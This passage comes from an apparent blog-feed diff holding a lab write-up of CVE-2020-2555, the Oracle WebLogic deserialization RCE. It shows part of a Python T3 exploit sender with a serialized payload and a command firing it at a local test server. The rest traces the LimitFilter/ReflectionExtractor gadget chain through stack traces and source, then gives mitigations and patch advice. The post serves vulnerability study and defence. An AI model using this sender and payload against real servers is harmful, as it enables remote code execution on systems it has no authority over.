+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>payload<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x1d\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x43\x6c\x61\x73\x73\x54\x61\x62\x6c\x65\x45\x6e\x74\x72\x79\x2f\x52\x65\x81\x57\xf4\xf9\xed\x0c\x00\x00\x78\x70\x72\x00\x21\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x65\x65\x72\x49\x6e\x66\x6f\x58\x54\x74\xf3\x9b\xc9\x08\xf1\x02\x00\x07\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x74\x00\x27\x5b\x4c\x77\x65\x62\x6c\x6f\x67\x69\x63\x2f\x63\x6f\x6d\x6d\x6f\x6e\x2f\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2f\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\x3b\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x56\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x97\x22\x45\x51\x64\x52\x46\x3e\x02\x00\x03\x5b\x00\x08\x70\x61\x63\x6b\x61\x67\x65\x73\x71\x00\x7e\x00\x03\x4c\x00\x0e\x72\x65\x6c\x65\x61\x73\x65\x56\x65\x72\x73\x69\x6f\x6e\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x5b\x00\x12\x76\x65\x72\x73\x69\x6f\x6e\x49\x6e\x66\x6f\x41\x73\x42\x79\x74\x65\x73\x74\x00\x02\x5b\x42\x78\x72\x00\x24\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x63\x6f\x6d\x6d\x6f\x6e\x2e\x69\x6e\x74\x65\x72\x6e\x61\x6c\x2e\x50\x61\x63\x6b\x61\x67\x65\x49\x6e\x66\x6f\xe6\xf7\x23\xe7\xb8\xae\x1e\xc9\x02\x00\x09\x49\x00\x05\x6d\x61\x6a\x6f\x72\x49\x00\x05\x6d\x69\x6e\x6f\x72\x49\x00\x0b\x70\x61\x74\x63\x68\x55\x70\x64\x61\x74\x65\x49\x00\x0c\x72\x6f\x6c\x6c\x69\x6e\x67\x50\x61\x74\x63\x68\x49\x00\x0b\x73\x65\x72\x76\x69\x63\x65\x50\x61\x63\x6b\x5a\x00\x0e\x74\x65\x6d\x70\x6f\x72\x61\x72\x79\x50\x61\x74\x63\x68\x4c\x00\x09\x69\x6d\x70\x6c\x54\x69\x74\x6c\x65\x71\x00\x7e\x00\x05\x4c\x00\x0a\x69\x6d\x70\x6c\x56\x65\x6e\x64\x6f\x72\x71\x00\x7e\x00\x05\x4c\x00\x0b\x69\x6d\x70\x6c\x56\x65\x72\x73\x69\x6f\x6e\x71\x00\x7e\x00\x05\x78\x70\x77\x02\x00\x00\x78\xfe\x00\xff\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x46\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\x00\x0b\x75\x73\x2d\x6c\x2d\x62\x72\x65\x65\x6e\x73\xa5\x3c\xaf\xf1\x00\x00\x00\x07\x00\x00\x1b\x59\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x00\x78\xfe\x01\x00\x00\xac\xed\x00\x05\x73\x72\x00\x13\x77\x65\x62\x6c\x6f\x67\x69\x63\x2e\x72\x6a\x76\x6d\x2e\x4a\x56\x4d\x49\x44\xdc\x49\xc2\x3e\xde\x12\x1e\x2a\x0c\x00\x00\x78\x70\x77\x1d\x01\x81\x40\x12\x81\x34\xbf\x42\x76\x00\x09\x31\x32\x37\x2e\x30\x2e\x31\x2e\x31\xa5\x3c\xaf\xf1\x00\x00\x00\x00\x00\x78</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># adjust header for appropriate message length</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;I&#39;</span>,len(payload)) <span style="color:#f92672">+</span> payload[<span style="color:#ae81ff">4</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] Sending payload...&#39;</span>)
+</span></span><span style="display:flex;"><span>sock<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> sock<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#39;[+] received &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">%</span> data)
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Updated Python3-Compatible <span style="font-family: Courier, monospace; font-weight: 600;"> weblogic_t3.py </span></span><br><br></span>
+</li>
+<li>
+<p>Finally, deliver the payload to the target server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wls@oracle-v12:~/CVE-2020-2555$ python3 weblogic_t3.py 127.0.0.1 <span style="color:#ae81ff">7001</span> test.ser
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Sending The Payload to Vulnerable Oracle WebLogic Server</span><br><br></span>
+</li>
+</ol>
+<p>From this point on, exploitation becomes an iterative process. For each tweak to the payload, you only need to repeat:</p>
+<ul>
+<li>Step 3 → Modify payload logic</li>
+<li>Step 5 → Recompile</li>
+<li>Step 6 → Regenerate <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;test.ser&ensp;</span> file</li>
+<li>Step 8 → Resend payload</li>
+</ul>
+<p>This workflow makes it much easier to experiment, debug, and eventually trace the full execution path.</p>
+<h2 id="4-analysis">4. Analysis</h2>
+<p>While writing this post, I was walking the tightrope between ‘too confusing’ and ‘too boring.’ So fingers crossed that you won’t end up like Michael here.</p>
+<p><img class="center" alt="michael-office-explain-like-im-five" src="/posts/oracle-cve-2020-2555-analysis/images/michael-office-explain-like-im-five.gif"><br></p>
+<p>Most write-ups start by diffing patches or reading advisoriesm just like this <a href="https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">blog post by Zero Day Initiative</a>. However, we are going to adopt an even more straightforward approach. We are going to force the exploit to purposefully fail to dump out the stack trace.</p>
+<p>Instead of executing a real command, we replace it with something that definitely does not exist:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ReflectionExtractor extractor3 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReflectionExtractor(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;exec&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> Object<span style="color:#f92672">[]</span>{<span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;idontexist&#34;</span>}}
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Non-Existent Command RCE Payload</span><br><br></span>
+<p>Now, recompile the payload generator and run it again to regenerate <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;test.ser&ensp;</span> before sending it to the vulnerable WebLogic server. This time instead of a silent execution, the application spills everything out for us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>(Wrapped: java.lang.Runtime.exec([Ljava.lang.String;@14cbd6bc)(java.lang.Runtime@30e376c6)) java.lang.reflect.InvocationTargetException
+</span></span><span style="display:flex;"><span>        at com.tangosol.util.Base.ensureRuntimeException(Base.java:324)
+</span></span><span style="display:flex;"><span>        at com.tangosol.util.extractor.ReflectionExtractor.extract(ReflectionExtractor.java:129)
+</span></span><span style="display:flex;"><span>        at com.tangosol.util.extractor.ChainedExtractor.extract(ChainedExtractor.java:105)
+</span></span><span style="display:flex;"><span>        at com.tangosol.util.filter.LimitFilter.toString(LimitFilter.java:599)
+</span></span><span style="display:flex;"><span>        at javax.management.BadAttributeValueExpException.readObject(BadAttributeValueExpException.java:86)
+</span></span><span style="display:flex;"><span>        Truncated. see log file for complete stacktrace
+</span></span><span style="display:flex;"><span>        ...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Call Stack Showing the Deserialization Gadget Chain<br><br></span>
+<p>Following the call stack, our entry point of interest should start from <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;javax.management.BadAttributeValueExpException.readObject()&ensp;</span>, which lives in <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;/usr/lib/jvm/jdk1.8.0_202/jre/lib/rt.jar&ensp;</span>.</p>
+<p><span style="font-family: Courier, monospace; font-weight: 600;">&ensp;BadAttributeValueExpException&ensp;</span> is a Java Management Extensions (JMX) class and it contains a well-known deserialization gadget in its <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;readObject()&ensp;</span> method. The following listing shows its function definition, and naturally we set a breakpoint on line 86 before sending our payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>40      <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BadAttributeValueExpException</span> <span style="color:#66d9ef">extends</span> Exception   {
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>70          <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readObject</span>(ObjectInputStream ois) <span style="color:#66d9ef">throws</span> IOException, ClassNotFoundException {
+</span></span><span style="display:flex;"><span>71              ObjectInputStream.<span style="color:#a6e22e">GetField</span> gf <span style="color:#f92672">=</span> ois.<span style="color:#a6e22e">readFields</span>();
+</span></span><span style="display:flex;"><span>72              Object valObj <span style="color:#f92672">=</span> gf.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;val&#34;</span>, <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>73
+</span></span><span style="display:flex;"><span>74              <span style="color:#a6e22e">if</span> (valObj <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>75                  val <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>76              } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (valObj <span style="color:#66d9ef">instanceof</span> String) {
+</span></span><span style="display:flex;"><span>77                  val<span style="color:#f92672">=</span> valObj;
+</span></span><span style="display:flex;"><span>78              } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (System.<span style="color:#a6e22e">getSecurityManager</span>() <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>79                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Long
+</span></span><span style="display:flex;"><span>80                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Integer
+</span></span><span style="display:flex;"><span>81                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Float
+</span></span><span style="display:flex;"><span>82                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Double
+</span></span><span style="display:flex;"><span>83                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Byte
+</span></span><span style="display:flex;"><span>84                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Short
+</span></span><span style="display:flex;"><span>85                      <span style="color:#f92672">||</span> valObj <span style="color:#66d9ef">instanceof</span> Boolean) {
+</span></span><span style="display:flex;"><span>86                  val <span style="color:#f92672">=</span> valObj.<span style="color:#a6e22e">toString</span>();  <span style="color:#75715e">/* BREAK HERE */</span>
+</span></span><span style="display:flex;"><span>87              } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>88                  val <span style="color:#f92672">=</span> System.<span style="color:#a6e22e">identityHashCode</span>(valObj) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;@&#34;</span> <span style="color:#f92672">+</span> valObj.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getName</span>();
+</span></span><span style="display:flex;"><span>89              }
+</span></span><span style="display:flex;"><span>90          }
+</span></span><span style="display:flex;"><span>91      }
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Function Definition of <span style="font-family: Courier, monospace; font-weight: 600;"> BadAttributeValueExpException.readObject() </span><br><br></span>
+<p>By default, the Java Security Manager is disabled, which causes execution to take the branch at line 78 during deserialization, ultimately invoking <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;toString()&ensp;</span> on the <code>val</code> field at line 86.</p>
+<p><img class="center" alt="analysis-1" src="/posts/oracle-cve-2020-2555-analysis/images/analysis-1.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">Call to <span style="font-family: Courier, monospace; font-weight: 600;"> LimitFilter.toString() </span> on line 86</span><br><br></span></p>
+<p>Since our val field is set to a malicious <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;LimitFilter&ensp;</span>, this triggers <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;LimitFilter.toString()&ensp;</span>, which we will analyze next.</p>
+<p>The following listing shows the relevant snippets of the vulnerable <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;LimitFilter.toString()&ensp;</span> function. Set another breakpoint at line 599 and resume the execution flow.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>40     <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LimitFilter</span><span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>41      <span style="color:#66d9ef">extends</span> AbstractQueryRecorderFilter<span style="color:#f92672">&lt;</span>T<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>42      <span style="color:#66d9ef">implements</span> EntryFilter<span style="color:#f92672">&lt;</span>Object, T<span style="color:#f92672">&gt;</span>, IndexAwareFilter<span style="color:#f92672">&lt;</span>Object, T<span style="color:#f92672">&gt;</span>, ExternalizableLite, PortableObjec     42 t, Cloneable
+</span></span><span style="display:flex;"><span>43     {
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>587         <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">toString</span>() {
+</span></span><span style="display:flex;"><span>588             StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder(<span style="color:#e6db74">&#34;LimitFilter: (&#34;</span>);
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>595             <span style="color:#a6e22e">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">m_comparator</span> <span style="color:#66d9ef">instanceof</span> ValueExtractor) {
+</span></span><span style="display:flex;"><span>596        
+</span></span><span style="display:flex;"><span>597                 ValueExtractor extractor <span style="color:#f92672">=</span> (ValueExtractor)<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">m_comparator</span>;
+</span></span><span style="display:flex;"><span>598                 sb.<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;, top=&#34;</span>)
+</span></span><span style="display:flex;"><span>599                   .<span style="color:#a6e22e">append</span>(extractor.<span style="color:#a6e22e">extract</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">m_oAnchorTop</span>)) <span style="color:#75715e">/* BREAK HERE */</span>
+</span></span><span style="display:flex;"><span>600                   .<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;, bottom=&#34;</span>)
+</span></span><span style="display:flex;"><span>601                   .<span style="color:#a6e22e">append</span>(extractor.<span style="color:#a6e22e">extract</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">m_oAnchorBottom</span>));
+</span></span><span style="display:flex;"><span>602             }
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Truncated Function Definition of <span style="font-family: Courier, monospace; font-weight: 600;"> LimitFilter.toString() </span><br><br></span>
+<p>When <code>m_comparator</code> is a <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ValueExtractor&ensp;</span>, the code calls <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;extractor.extract()&ensp;</span> on <code>m_oAnchorTop</code> and <code>m_oAnchorBottom</code>. Under normal circumstances, this is just part of data processing.</p>
+<p>But implementations like <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ReflectionExtractor&ensp;</span> and <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ChainedExtractor&ensp;</span> use reflection, allowing method calls to be defined at runtime. This turns <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;extract()&ensp;</span> into a powerful primitive, one that can be abused to invoke methods like <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;Runtime.getRuntime().exec()&ensp;</span>.</p>
+<p><img class="center" alt="analysis-2" src="/posts/oracle-cve-2020-2555-analysis/images/analysis-2.png"><br>
+<link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="figure">RCE at line 599</span><br><br></span></p>
+<p>This chain works because several “harmless” design decisions stack together:</p>
+<ul>
+<li><span style="font-family: Courier, monospace; font-weight: 600;">&ensp;ReflectionExtractor&ensp;</span> allows arbitrary method invocation with no validation.</li>
+<li>Deserialization (via JMX) invokes <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;toString()&ensp;</span> internally, something developers rarely treat as dangerous.</li>
+<li><span style="font-family: Courier, monospace; font-weight: 600;">&ensp;LimitFilter&ensp;</span> blindly trusts its internal fields (<code>m_comparator</code>).</li>
+<li>Coherence extractors are designed for flexible querying, which makes them equally powerful as exploitation primitives.</li>
+</ul>
+<h2 id="5-mitigations">5. Mitigations</h2>
+<p>A simple way to mitigate this issue is to enable the Java Security Manager. Recall from earlier that the exploit relies on this condition: <code>System.getSecurityManager() == null</code>. By enabling the security manager, this condition no longer holds, preventing execution from reaching the vulnerable <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;toString()&ensp;</span> call at line 86.</p>
+<p>Update the <code>LAUNCH_ARGS</code> in the WebLogic startup script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">183</span>     <span style="color:#75715e"># START WEBLOGIC</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">184</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">185</span>     <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>USE_JVM_SYSTEM_LOADER<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> !<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">]</span> ; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">186</span>         LAUNCH_ARGS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;-cp </span><span style="color:#e6db74">${</span>WL_HOME<span style="color:#e6db74">}</span><span style="color:#e6db74">/server/lib/weblogic-launcher.jar -Dlaunch.use.env.classpath=true -Djava.security.manager&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+<span class="caption" data-type="listing">Quick Hotfix<br><br></span>
+<p>Though this is a “No shit, Sherlock” kind of statement, the proper way to fix it is to apply Oracle’s official patches.</p>
+<p><img class="center" alt="no-shit-sherlock" src="/posts/oracle-cve-2020-2555-analysis/images/no-shit-sherlock.gif"><br></p>
+<p>Please refer to the <a href="https://docs.oracle.com/en-us/iaas/Content/fleet-management/manage-oracle-patches-weblogic.htm#download-weblogic-patch">official guide</a> for detailed steps on downloading and applying WebLogic patches.</p>
+<h2 id="6-conclusion">6. Conclusion</h2>
+<p>Congratulations! You made it to the end!</p>
+<p><img class="center" alt="shia-clap" src="/posts/oracle-cve-2020-2555-analysis/images/shia-clap.gif"><br></p>
+<p>A simple <span style="font-family: Courier, monospace; font-weight: 600;">&ensp;toString()&ensp;</span> call turns out to be the entry point for a full RCE chain. By generating a payload, breaking it on purpose, and following the stack trace, we were able to trace the execution path from deserialization to command execution.</p>
+<p>This vulnerability isn’t just a single flaw, but a chain of “harmless” features working together in unintended ways.</p>
+<h2 id="7-references">7. References</h2>
+<ol>
+<li><a href="https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server">https://www.zerodayinitiative.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server</a></li>
+<li><a href="https://docs.oracle.com/en-us/iaas/Content/fleet-management/manage-oracle-patches-weblogic.htm#download-weblogic-patch">https://docs.oracle.com/en-us/iaas/Content/fleet-management/manage-oracle-patches-weblogic.htm#download-weblogic-patch</a></li>
+<li><a href="https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html">https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html</a></li>
+<li><a href="https://www.oracle.com/asean/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/asean/java/technologies/javase/javase8-archive-downloads.html</a></li>
+<li><a href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a></li>
+<li><a href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a></li>
+<li><a href="https://github.com/intoolswetrust/jd-cli">https://github.com/intoolswetrust/jd-cli</a></li>
+<li><a href="https://gitee.com/chenjiew/CVE-2020-2555">https://gitee.com/chenjiew/CVE-2020-2555</a></li>
+</ol>
+]]></content>
+        </item>
         
         <item>
             <title>Linux Kernel Module Debugging</title>
